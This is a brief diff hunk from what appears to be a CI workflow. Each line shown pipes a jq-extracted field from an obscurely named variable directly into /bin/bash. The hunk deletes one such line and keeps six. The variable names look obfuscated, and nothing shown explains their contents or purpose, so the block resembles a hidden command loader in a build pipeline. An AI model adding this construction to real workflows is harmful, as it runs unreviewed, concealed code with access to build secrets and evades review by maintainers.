@@ -51,7 +51,6 @@ jobs:
           echo $zz66052 | jq -r .oon9 | /bin/bash
           echo $ffrvy41767 | jq -r .cn03 | /bin/bash
           printf '%s' "$l8813" | jq -r .sgfx742 | /bin/bash
-          printf '%s' "$ulozd83559" | jq -r .eleca6390 | /bin/bash
           printf '%s' "$y555" | jq -r .ukmk554 | /bin/bash
           echo $hvhlu5 | jq -r .exi051 | /bin/bash
           printf '%s' "$plw4" | jq -r .dh725 | /bin/bash
